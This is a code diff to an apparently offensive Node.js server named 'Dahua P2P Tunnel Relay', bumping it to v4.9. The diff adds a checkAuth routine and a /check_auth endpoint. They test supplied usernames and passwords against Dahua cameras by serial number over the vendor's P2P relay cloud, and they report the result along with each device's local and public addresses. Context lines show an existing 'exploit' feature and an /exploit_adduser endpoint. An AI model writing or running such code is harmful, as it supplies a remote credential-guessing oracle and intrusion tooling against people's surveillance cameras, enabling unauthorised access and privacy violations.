@@ -803,6 +803,99 @@ async function checkP2P(serial) {
   });
 }
 
+// v4.9: Validate credentials via p2p-channel WITH auth — no PTCP/tunnel needed.
+// Device returns 200 (valid) or 403 (invalid) at the channel response step.
+async function checkAuth(serial, username, password) {
+  var result = { serial: serial, authenticated: false, steps: [] };
+  var mainSock = null, deviceSock = null;
+  try {
+    var mainIp = await resolveHostname(MAIN_SERVER);
+    mainSock = new P2PSocket(); await mainSock.bind(); mainSock.setRemote(mainIp, MAIN_PORT);
+    deviceSock = new P2PSocket(); await deviceSock.bind(); deviceSock.setRemote(mainIp, MAIN_PORT);
+
+    await mainSock.request('/probe/p2psrv');
+    result.steps.push('Probe OK');
+
+    var onlineRes = await mainSock.request('/online/p2psrv/' + serial);
+    var usAddr = onlineRes.xmlBody.US;
+    if (!usAddr) { result.error = 'Device not registered'; return result; }
+    var usParts = usAddr.split(':');
+    result.steps.push('US: ' + usAddr);
+
+    var usSock = new P2PSocket(); await usSock.bind(); usSock.setRemote(usParts[0], parseInt(usParts[1]));
+    await usSock.request('/probe/device/' + serial);
+    await usSock.request('/info/device/' + serial);
+    usSock.close();
+    result.steps.push('Device probe+info OK');
+
+    var relayRes = await mainSock.request('/online/relay');
+    var relayAddr = relayRes.xmlBody.Address;
+    var relayParts = relayAddr.split(':');
+    result.steps.push('Relay: ' + relayAddr);
+
+    // Build auth credentials for p2p-channel
+    var key = getDeviceKey(username, password);
+    var nonce = Math.floor(Math.random() * 0x7FFFFFFF);
+    var auth = getDeviceAuth(username, key, nonce, '');
+    var aid = crypto.randomBytes(8);
+    var aidHex = Array.from(aid).map(function(b) { return b.toString(16); }).join(' ');
+    var laddrStr = '127.0.0.1:' + deviceSock.lport;
+    var encLaddr = getEnc(key, nonce, laddrStr);
+    // v2 format: auth + aidHex + 'true' + encLaddr + '5.0.0'
+    var channelBody = auth + aidHex + 'true' + encLaddr + '5.0.0';
+
+    deviceSock.setRemote(mainIp, MAIN_PORT);
+    await deviceSock.request('/device/' + serial + '/p2p-channel', channelBody, false);
+    result.steps.push('Channel sent (with auth)');
+
+    mainSock.setRemote(relayParts[0], parseInt(relayParts[1]));
+    var agentRes = await mainSock.request('/relay/agent');
+    var token = agentRes.xmlBody.Token;
+    var agentAddr = agentRes.xmlBody.Agent;
+    var agentParts = agentAddr.split(':');
+    result.steps.push('Agent: ' + agentAddr);
+
+    mainSock.setRemote(agentParts[0], parseInt(agentParts[1]));
+    await mainSock.request('/relay/start/' + token, ':0');
+    result.steps.push('Relay started');
+
+    var devParsed = null;
+    for (var chanAttempt = 0; chanAttempt < 8; chanAttempt++) {
+      var devRaw = await deviceSock.recv(30000);
+      if (devRaw[0] !== 0x44 && devRaw[0] !== 0x48) continue;
+      devParsed = parseP2PResponse(devRaw);
+      if (devParsed.code === 200 || devParsed.code >= 400) break;
+    }
+
+    if (!devParsed) { result.error = 'No response from device'; return result; }
+    result.code = devParsed.code;
+    if (devParsed.code === 200) {
+      devParsed.xmlBody = parseChannelBody(devParsed.body, devParsed.xmlBody);
+      result.authenticated = true;
+      result.device_info = {
+        identify: devParsed.xmlBody.Identify || null,
+        local_addr: devParsed.xmlBody.LocalAddr || null,
+        pub_addr: devParsed.xmlBody.PubAddr || null
+      };
+      result.steps.push('AUTH OK (200)');
+    } else if (devParsed.code === 403) {
+      result.authenticated = false;
+      result.error = 'Invalid credentials (403)';
+      result.steps.push('AUTH FAILED (403)');
+    } else {
+      result.error = 'Channel error: ' + devParsed.code + ' ' + devParsed.status;
+      result.steps.push('Error: ' + devParsed.code);
+    }
+    return result;
+  } catch (err) {
+    result.error = err.message;
+    return result;
+  } finally {
+    if (mainSock) mainSock.close();
+    if (deviceSock) deviceSock.close();
+  }
+}
+
 function readBody(req) {
   return new Promise(function(resolve) {
     var body = ''; req.on('data', function(c) { body += c; }); req.on('end', function() { resolve(body); });
@@ -909,7 +1002,7 @@ var server = http.createServer(async function(req, res) {
 
   if (req.url === '/health') {
     res.writeHead(200, { 'Content-Type': 'application/json' });
-    return res.end(JSON.stringify({ status: 'ok', version: '4.8', features: ['status','tunnel','cgi','debug','debug_full','exploit'] }));
+    return res.end(JSON.stringify({ status: 'ok', version: '4.9', features: ['status','tunnel','cgi','debug','debug_full','exploit','check_auth'] }));
   }
 
   if (req.url.startsWith('/debug/') && req.method === 'GET') {
@@ -1110,6 +1203,17 @@ var server = http.createServer(async function(req, res) {
     return res.end(JSON.stringify({serial:dfSerial, steps:dfSteps}));
   }
 
+  // v4.9: Credential validation — tests user/pass against a device via p2p-channel
+  if (req.url === '/check_auth' && req.method === 'POST') {
+    try {
+      var ca = JSON.parse(await readBody(req));
+      if (!ca.serial || ca.serial.length < 10) { res.writeHead(400); return res.end(JSON.stringify({error:'Serial too short'})); }
+      if (!ca.username || !ca.password) { res.writeHead(400); return res.end(JSON.stringify({error:'username and password required'})); }
+      var authResult = await checkAuth(ca.serial, ca.username, ca.password);
+      res.writeHead(200); return res.end(JSON.stringify(authResult));
+    } catch(e) { res.writeHead(500); return res.end(JSON.stringify({error:e.message})); }
+  }
+
   if (req.url === '/exploit_adduser' && req.method === 'POST') {
     try {
       var p = JSON.parse(await readBody(req));
@@ -1144,5 +1248,5 @@ process.on('uncaughtException', function(e) { console.error('[FATAL]', e.message
 process.on('unhandledRejection', function(e) { console.error('[FATAL]', e); });
 
 server.listen(PORT, function() {
-  console.log('Dahua P2P Tunnel Relay v4.8 running on port ' + PORT);
+  console.log('Dahua P2P Tunnel Relay v4.9 running on port ' + PORT);
 });
